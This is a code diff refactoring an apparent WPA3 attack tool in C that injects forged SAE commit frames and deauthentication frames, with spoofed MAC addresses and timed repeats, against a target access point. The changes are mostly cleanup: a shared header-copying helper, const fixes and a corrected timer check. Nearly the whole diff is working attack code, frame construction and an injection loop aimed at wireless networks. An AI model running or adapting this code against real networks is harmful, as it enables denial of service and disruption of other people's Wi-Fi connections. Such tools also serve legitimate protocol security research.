@@ -26,68 +26,62 @@ static int card_write(const struct state *state, void *buf, const int len) {
 	return wi_write(state->wi, NULL, 0, buf, len, NULL);
 }
 
-static int get_group(const int group, unsigned char *buf) {
+static int get_group(const int group_id, unsigned char *buf) {
 	int len;
+	unsigned char *group;
 
-	switch (group) {
+	switch (group_id) {
 		case 22:
 			len = AUTH_REQ_SAE_COMMIT_GROUP_22_SIZE;
-			memcpy(buf, AUTH_REQ_SAE_COMMIT_GROUP_22, len);
+			group = AUTH_REQ_SAE_COMMIT_GROUP_22;
 			break;
 		case 23:
 			len = AUTH_REQ_SAE_COMMIT_GROUP_23_SIZE;
-			memcpy(buf, AUTH_REQ_SAE_COMMIT_GROUP_23, len);
+			group = AUTH_REQ_SAE_COMMIT_GROUP_23;
 			break;
 		case 24:
 			len = AUTH_REQ_SAE_COMMIT_GROUP_24_SIZE;
-			memcpy(buf, AUTH_REQ_SAE_COMMIT_GROUP_24, len);
+			group = AUTH_REQ_SAE_COMMIT_GROUP_24;
 			break;
 		default:
 			return 0;
 	}
 
+	memcpy(buf, group, len);
 	return len;
 }
 
-static void inject_sae_commit(struct state *state) {
-	unsigned char buf[2048] = {0};
-
-	if (!state->started_attack)
-		return;
-
-	const int len = get_group(state->group, buf);
-
+static void copy_header(const struct state *state, unsigned char *buf) {
 	memcpy(buf + 4, state->bssid, 6);
 	memcpy(buf + 10, state->srcaddr, 6);
 	memcpy(buf + 16, state->bssid, 6);
+}
+
+static void inject_sae_commit(struct state *state) {
+	if (!state->started_attack)
+		return;
+
+	unsigned char buf[2048] = {};
+	const int len = get_group(state->group, buf);
+	copy_header(state, buf);
 
 	if (card_write(state, buf, len) == -1)
 		perror("card_write");
 
 	clock_gettime(CLOCK_MONOTONIC, &state->prev_commit);
-	state->got_reply = 0;
 }
 
 static void inject_deauth(const struct state *state) {
 	unsigned char *buf = DEAUTH_FRAME;
-
-	memcpy(buf + 4, state->bssid, 6);
-	memcpy(buf + 10, state->srcaddr, 6);
-	memcpy(buf + 16, state->bssid, 6);
+	copy_header(state, buf);
 
 	if (card_write(state, buf, DEAUTH_FRAME_SIZE) == -1)
 		perror("card_write");
 }
 
 static void queue_next_commit(const struct state *state) {
-	struct itimerspec timespec;
-
-	/* initial expiration of the timer */
-	timespec.it_value.tv_sec = 0;
+	struct itimerspec timespec = {};
 	timespec.it_value.tv_nsec = state->delay * 1000 * 1000;
-	/* periodic expiration of the timer */
-	timespec.it_interval.tv_sec = 0;
-	timespec.it_interval.tv_nsec = 0;
 
 	if (timerfd_settime(state->time_fd_inject, 0, &timespec, NULL) == -1)
 		perror("timerfd_settime()");
@@ -236,7 +230,7 @@ static void check_timeout(const struct state *state) {
 		diff.tv_nsec = curr.tv_nsec - state->prev_commit.tv_nsec;
 		diff.tv_sec = curr.tv_sec - state->prev_commit.tv_sec;
 	} else {
-		diff.tv_nsec = 1000000000 + curr.tv_nsec - state->prev_commit.tv_nsec;
+		diff.tv_nsec = curr.tv_nsec - state->prev_commit.tv_nsec + 1000 * 1000 * 1000;
 		diff.tv_sec = curr.tv_sec - state->prev_commit.tv_sec - 1;
 	}
 
@@ -273,7 +267,7 @@ static void event_loop(struct state *state, char *dev) {
 	state->srcaddr[5] = state->curraddr;
 
 	// 4. Initialize periodic timer to detect timeouts
-	int timer_fd = timerfd_create(CLOCK_MONOTONIC, 0);
+	const int timer_fd = timerfd_create(CLOCK_MONOTONIC, 0);
 	if (timer_fd == -1)
 		perror("timerfd_create()");
 
@@ -289,7 +283,7 @@ static void event_loop(struct state *state, char *dev) {
 		perror("timerfd_settime()");
 
 	state->time_fd_inject = timerfd_create(CLOCK_MONOTONIC, 0);
-	if (timer_fd == -1)
+	if (state->time_fd_inject == -1)
 		perror("timerfd_create()");
 
 	// 6. Now start the main event loop
@@ -311,14 +305,11 @@ static void event_loop(struct state *state, char *dev) {
 		if (fds[0].revents & POLLIN)
 			card_receive(state);
 
+		// TODO - do we really need timeout?
 		// This timer is periodically called, detects timeouts, and implicity starts the attack
 		if (fds[1].revents & POLLIN) {
 			uint64_t exp;
-			// WPA3_ATTACK
-			if (read(timer_fd, &exp, sizeof(uint64_t)) != sizeof(uint64_t)) {
-				printf("read timer_fd fail\n");
-			}
-			// assert(read(timer_fd, &exp, sizeof(uint64_t)) == sizeof(uint64_t));
+			assert(read(timer_fd, &exp, sizeof(uint64_t)) == sizeof(uint64_t));
 			check_timeout(state);
 		}
 
@@ -332,18 +323,14 @@ static void event_loop(struct state *state, char *dev) {
 }
 
 static void sighandler(int signum) {
-	struct state *state = get_state();
+	const struct state *state = get_state();
 
 	if (signum == SIGPIPE || signum == SIGINT) {
-		time_t t = time(NULL);
-		struct tm tm = *localtime(&t);
+		const time_t t = time(NULL);
+		const struct tm tm = *localtime(&t);
 
-		if (state->fp != NULL)
-			fprintf(state->fp, "Stopping at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900, tm.tm_mon + 1,
-			        tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
-		else
-			printf("Stopping at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
-			       tm.tm_hour, tm.tm_min, tm.tm_sec);
+		fprintf(state->fp != NULL ? state->fp : stdout, "Stopping at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900,
+		        tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
 
 		exit(0);
 	}
@@ -366,7 +353,6 @@ int main(const int argc, char *argv[]) {
 
 	memset(state, 0, sizeof(*state));
 	state->curraddr = 0;
-	state->debug_level = 1;
 	state->group = 24;
 	state->delay = 250;
 	state->timeout = 750;
